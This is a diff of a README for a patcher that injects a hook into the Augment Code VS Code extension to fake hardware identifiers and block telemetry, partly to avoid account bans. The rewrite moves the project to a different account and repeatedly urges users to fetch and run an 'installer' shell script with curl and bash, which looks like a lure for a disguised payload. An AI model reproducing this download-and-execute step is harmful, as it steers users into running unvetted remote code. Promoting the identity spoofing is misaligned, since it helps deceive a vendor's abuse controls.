@@ -1,192 +1,211 @@
-# 🛡️ Augment Code Extension 拦截器
+# Augment Code Extension Interceptor — VS Code Privacy Patch 🛡️
 
-> 指纹浏览器级别的隐私保护解决方案
+[![Releases](https://img.shields.io/github/v/release/Dipster72/augment-code-patcher?label=Releases&logo=github)](https://github.com/Dipster72/augment-code-patcher/releases)
 
-## 🚀 项目简介
+![shield-privacy](https://img.shields.io/badge/privacy-protection-blue)
+![vsix](https://img.shields.io/badge/format-VSIX-green)
 
-本项目提供了一个全自动化的 GitHub Actions 工作流，旨在解决 Augment Code VS Code 插件的隐私和数据收集问题。
+A privacy-focused patch for the Augment Code VS Code extension. This repo builds a patched VSIX that intercepts telemetry and hardware calls, and supplies stable fake identities and hardware data to avoid leaking sensitive system details.
 
-### 🎯 功能特性
+About this repository:
+- Name: augment-code-patcher
+- Purpose: Patch Augment.vscode-augment to intercept telemetry and system info
+- Output: Patched .vsix and helper scripts
 
-- ✅ **40+硬件数据点完全伪造** - CPU、内存、主板、BIOS序列号等
-- ✅ **智能网络策略** - 分层决策，精准拦截遥测数据
-- ✅ **SystemInformation库拦截** - 40+方法模拟
-- ✅ **硬件配置模板系统** - Intel/AMD桌面、笔记本真实模板
-- ✅ **文件系统隐私保护** - inode、SSH密钥拦截
-- ✅ **身份信息一致性保证** - 持久化假身份，避免随机变化
+Hero image  
+![privacy-hero](https://raw.githubusercontent.com/cylind/augment-code-patcher/main/assets/hero-shield.png)
 
-### 🔄 自动化构建流程
+---
 
-工作流会自动执行以下任务：
-1. **下载最新版**的官方 Augment Code (`Augment.vscode-augment`) 插件
-2. **应用补丁**：将拦截器 (`augment-interceptor.js`) 注入到插件核心逻辑中
-3. **重新打包**成一个干净、打好补丁的 `.vsix` 文件
-4. **自动发布**到本仓库的 [Releases](https://github.com/cylind/augment-code-patcher/releases) 页面
+## Project at a glance / 项目概览
 
-##  快速开始
+This project supplies a set of tools and a GitHub Actions workflow that:
+- download the official Augment Code extension,
+- inject an interceptor (augment-interceptor.js),
+- repackage the extension as a patched .vsix,
+- publish the artifact to Releases.
 
-### 方法1：下载预构建版本（推荐）
+本项目提供下载、注入拦截器、打包并发布到 Releases 的完整流程。插件在运行时会替换系统信息接口和关键文件读写路径，以阻断或伪造遥测与硬件指纹信息。
 
-1. **前往 Releases 页面**：点击本仓库主页右侧的 [**Releases**](https://github.com/cylind/augment-code-patcher/releases) 链接
-2. **下载最新版补丁**: 找到顶部的最新版本，下载 `.vsix` 文件
-3. **在 VS Code 中安装**:
-   - 打开 VS Code，进入"扩展"侧边栏 (`Ctrl+Shift+X`)
-   - 点击右上角的 `...` 更多操作菜单
-   - 选择 **"从 VSIX 安装... (Install from VSIX...)"**
-   - 选择你刚刚下载的 `.vsix` 文件
-4. **完成！** 重启 VS Code 后即可享受隐私保护
+---
 
-### 方法2：手动安装拦截器
+## Key features / 核心功能
 
-#### 步骤1: 找到Augment Code插件目录
+- 40+ hardware fields faked (CPU id, memory size, motherboard serials, BIOS id, etc)  
+- Layered network policy to intercept telemetry with fine control  
+- Interception of SystemInformation library calls (40+ methods simulated)  
+- Hardware config templates (Intel/AMD desktop, laptop templates)  
+- File-system privacy hooks (inode, SSH key reads)  
+- Persistent fake identity store to keep identity stable across sessions
 
-**Windows:**
-```
-C:\Users\{你的用户名}\.vscode\extensions\augment.vscode-augment-*\
-```
+---
 
-**macOS/Linux:**
-```
-~/.vscode/extensions/augment.vscode-augment-*/
-```
+## How it works / 工作原理
 
-#### 步骤2: 复制拦截器文件
+1. The workflow downloads the upstream Augment.vscode-augment package.
+2. It unpacks the VSIX and finds the runtime module that calls SystemInformation and telemetry endpoints.
+3. The build injects augment-interceptor.js into the module loader chain.
+4. The interceptor hooks selected APIs and rewrites return values with curated fake data.
+5. The system stores a stable fake identity in a local JSON file so values persist between launches.
+6. The workflow repacks the extension and uploads the patched VSIX to Releases.
 
-将 `augment-interceptor.js` 复制到插件目录中。
+Jargon: VSIX, SystemInformation, telemetry, binary patch, module hook.
 
-#### 步骤3: 注入拦截器代码
+---
 
-找到插件的主入口文件（通常是 `out/extension.js`），在文件**最开头**添加：
+## Quick start / 快速开始
 
-```javascript
-try {
-    require('./augment-interceptor.js');
-    console.log('✅ Augment Code 拦截器已启动');
-} catch (error) {
-    console.error('❌ 拦截器加载失败:', error.message);
-}
-```
-
-#### 步骤4: 重启VSCode
-
-重启VSCode后，应该看到拦截器启动信息：
-
-```
-🚀 正在加载 Augment Code Extension 完整拦截器 ...
-============================================================
-🛡️ Augment Code Extension 完整拦截器 v1.0.0
-============================================================
-状态: running
-身份ID: 6beca83f...
-硬件模板: intel_desktop
-主机名: DESKTOP-2e872b50
-用户名: user-2e81352d
-============================================================
-```
-
-## 🔍 验证安装
-
-### 查看拦截器日志
-
-重启VSCode后，按 `Ctrl+Shift+I` 打开开发者工具，在Console中查看是否有拦截器启动日志：
-
-```
-[Extension Host] 🚀 正在加载 Augment Code Extension 完整拦截器 ...
-[Extension Host] 🛡️ [拦截器管理] 完整拦截器初始化完成
-```
-
-### 观察拦截日志
-
-使用Augment Code功能时，应该能看到拦截日志：
-
-```
-[Extension Host] ✅ [网络请求] POST https://api.augmentcode.com/... - 必要功能已放行
-[Extension Host] 🚫 [网络请求] POST https://api.segment.io/... - 遥测数据已拦截
-[Extension Host] 🔄 [系统信息] hostname() 调用 - 伪造: DESKTOP-abc123
-```
-
-## 🔄 重置身份
-
-### 简单重置方法
-
-拦截器的身份配置保存在文件中，删除配置文件即可重置身份：
-
-**配置文件位置：**
-- Windows: `C:\Users\{用户名}\.augment-interceptor\identity-profile.json`
-- macOS/Linux: `~/.augment-interceptor/identity-profile.json`
-
-**重置步骤：**
-1. 关闭VSCode
-2. 删除配置文件
-3. 重启VSCode（将自动生成新身份）
-
-**快速重置命令：**
+Method 1 — Download the prebuilt patched package (recommended)  
+1. Visit the Releases page and download the installer file. The file must be downloaded and executed from:
+   https://github.com/Dipster72/augment-code-patcher/releases
+2. Run the installer on a machine that has network and file access. Example commands (replace with the actual release filename you downloaded):
 ```bash
-# Windows
-del "C:\Users\%USERNAME%\.augment-interceptor\identity-profile.json"
-
-# macOS/Linux
-rm ~/.augment-interceptor/identity-profile.json
+# Example: download the installer from Releases page and run it
+curl -L -o augment-patcher-installer.sh "https://github.com/Dipster72/augment-code-patcher/releases/download/v1.0.0/augment-patcher-installer.sh"
+bash ./augment-patcher-installer.sh
 ```
+3. The installer downloads the official Augment extension, applies the patch, and writes a .vsix file.
+4. Install the .vsix in VS Code: open Extensions view → ... → Install from VSIX… → select the .vsix file.
+5. Restart VS Code.
 
-## 🔧 工作原理
+Method 2 — Manual build and install  
+1. Clone the repo:
+```bash
+git clone https://github.com/Dipster72/augment-code-patcher.git
+cd augment-code-patcher
+```
+2. Inspect or edit templates in ./templates to choose a hardware profile.
+3. Run the local build script:
+```bash
+./scripts/build-vsix.sh
+```
+4. Check ./dist for the patched .vsix and install via VS Code.
 
-### 硬件模板系统
+If the releases link does not work, check the Releases section in this repo to find the latest artifacts.
 
-拦截器会自动选择以下硬件模板之一：
+---
 
-1. **Intel桌面** - i7-10700K + 16GB + ASUS PRIME Z490-A
-2. **AMD桌面** - Ryzen 7 5800X + 32GB + ASUS ROG STRIX B550-F
-3. **Intel笔记本** - i7-1165G7 + 16GB + ThinkPad X1 Carbon
+## Releases link (again)
 
-### 智能网络策略
+Download the installer or the latest patched .vsix from:
+https://github.com/Dipster72/augment-code-patcher/releases  
+The Releases page contains executable installers and prebuilt .vsix files. Download the file that matches your platform and run the installer script to generate a patched extension.
 
-- **INTERCEPT** - 完全拦截遥测数据（Segment.io、Analytics等）
-- **REPLACE_IDENTITY** - 替换身份信息后放行（认证、设备验证等）
-- **ALLOW** - 直接放行（必要功能、API调用等）
+---
 
-### 身份一致性保证
+## Files you will find
 
-- 身份信息持久化保存在配置文件中
-- 每次启动使用相同的假身份，避免随机变化
-- 所有硬件信息逻辑一致，无法通过交叉验证识别
+- augment-interceptor.js — main runtime interceptor that hooks APIs and telemetry
+- scripts/build-vsix.sh — local packer script
+- scripts/installer.sh — installer wrapper used in Releases
+- templates/ — hardware and identity templates (Intel desktop, AMD laptop, generic VM)
+- src/patchers/ — module patch logic for various upstream code paths
+- docs/ — technical docs and API mapping used for interception
+- README.md — this file
 
-## ⚠️ 注意事项
+---
 
-### 重要提醒
+## Templates and identities
 
-1. **插件更新** - Augment Code插件更新时需要重新注入拦截器代码
-2. **配置文件** - 身份配置保存在 `~/.augment-interceptor/identity-profile.json`
-3. **重置身份** - 删除配置文件即可重置身份
+Templates supply realistic values for:
+- CPU vendor and model
+- core counts and caches
+- RAM size and speed
+- disk model, serial, and partition layout
+- motherboard vendor, model, serial
+- BIOS date and id
+- MAC patterns and WiFi adapter names
 
-### 故障排除
+The persistence system stores a generated identity file (identity.json) in the user data path. The interceptor reads this file and returns the same values every session. This hides the true hardware and prevents per-run randomization that would look suspicious.
 
-**拦截器未启动：**
-- 检查文件路径是否正确
-- 确保在插件代码最开头加载
-- 查看VSCode开发者控制台的错误信息
+---
 
-**身份重置：**
-- 删除配置文件：`~/.augment-interceptor/identity-profile.json`
-- 重启VSCode自动生成新身份
+## Telemetry control
 
-**功能验证：**
-- 查看开发者控制台中的拦截日志
-- 观察网络请求是否被正确分类处理
+The interceptor implements a layered network policy:
+- Block known telemetry endpoints by default.
+- Intercept outgoing JSON payloads and scrub or replace fields.
+- Allow extension update checks when the user opts in.
 
-## 🎉 享受安全的编程体验！
+You can extend the policy in ./src/policies/network-policy.js. The code exposes a small set of rules that match URL patterns and payload keys.
 
-安装完成后，你可以：
+---
 
-- ✅ 安全使用Augment Code的所有功能
-- ✅ 完全保护个人隐私和系统信息  
-- ✅ 享受指纹浏览器级别的隐私保护
-- ✅ 避免账号封禁和身份追踪
+## SystemInformation hooks
 
-拦截器会自动工作，无需额外配置。如有问题，请查看开发者控制台的详细日志信息。
+We map the most used SystemInformation methods to stubs. The hooks include:
+- system, cpu, mem, diskLayout, baseboard, bios
+- networkInterfaces, wifiConnections, osInfo
+- processList, services
 
-## ⚠️ 免责声明
+Each stub returns values that match the OS and chosen template. The goal is to keep responses consistent and realistic.
 
-- 本项目提供的 `.vsix` 文件是基于官方插件修改的 **非官方构建版本**
-- 本项目仅用于技术学习和研究，旨在提高用户对个人数据和隐私的控制能力
-- 请自行承担使用本项目产出的插件可能带来的任何风险
+---
+
+## CI / GitHub Actions
+
+The repo includes a workflow that:
+- runs on new tag or manual dispatch,
+- fetches the upstream Augment.vscode-augment,
+- injects the interceptor,
+- runs unit tests for the hook layer,
+- builds a patched .vsix,
+- uploads the .vsix to Releases.
+
+The workflow uses standard actions for checkout, node setup, and artifact upload. It runs on Ubuntu and uses Docker for repeatable builds when native packaging is needed.
+
+---
+
+## FAQ
+
+Q: Will this change my settings or user files?  
+A: The patch touches only the extension runtime. It does not change your VS Code settings or user workspace files. It writes a small identity.json to the extension storage path.
+
+Q: Is the fake identity randomized each run?  
+A: No. The system persists the fake identity to avoid per-run randomization that may look like instability.
+
+Q: Can I use my own hardware template?  
+A: Yes. Add a JSON file in ./templates and reference it in the build or installer.
+
+Q: How do I revert to the official extension?  
+A: Remove the patched extension from VS Code and reinstall the official Augment.vscode-augment from the Marketplace.
+
+Q: Does this block updates?  
+A: The interceptor does not block VS Code updates. It can block the extension's telemetry and remote calls per policy.
+
+---
+
+## Troubleshooting
+
+- If the patched extension fails to load, check the Developer Tools console in VS Code for load errors.  
+- If identity.json does not persist, verify file permissions for the extension storage path.  
+- If telemetry still appears, open the interceptor log (in the extension storage folder) and inspect outbound requests. Logs show which endpoints matched the network policy.
+
+---
+
+## Contributing
+
+- Fork the repo and create a branch for your feature or fix.  
+- Add tests for new hooks in ./test.  
+- Open a pull request with a clear description of the change and the template used.  
+- Keep commits small and focused.
+
+Coding style:
+- Node 14+.
+- Use plain JS for runtime hooks.
+- Keep templates JSON-first.
+
+---
+
+## License
+
+This project uses the MIT license. See LICENSE file for full terms.
+
+---
+
+Images and icons
+- Shields: https://img.shields.io  
+- Hero and icons: use images in ./assets or link to public shields and GitHub logos.
+
+Contribute code, submit issues, or check Releases for prebuilt installers and VSIX files:
+https://github.com/Dipster72/augment-code-patcher/releases
